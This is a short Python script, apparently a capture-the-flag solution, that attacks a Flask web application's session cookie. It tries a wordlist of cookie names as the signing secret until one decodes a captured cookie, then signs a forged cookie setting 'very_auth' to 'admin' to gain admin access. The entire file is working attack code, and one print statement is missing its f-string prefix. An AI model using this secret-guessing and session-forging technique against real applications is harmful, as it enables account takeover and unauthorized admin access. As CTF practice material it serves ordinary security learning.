import os
import sys
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
val = 'eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Y_-_eQ.dyLAww65rvK_LrSuMbJDksBGeHU'
secret = None
for cookie in cookie_names:
	print(cookie)
	out = os.popen(f'flask_session_cookie_manager3.py decode -s "{cookie}" -c {val}').read()
	if out.find('error') == -1:
		print('{cookie} works!')
		print(out)
		secret = cookie
		break
if secret == None:
	raise Exception("Couldn't find working secret")
payload = '{"very_auth":"admin"}'
os.system(f'flask_session_cookie_manager3.py encode -s "{secret}" -t \'{payload}\'')
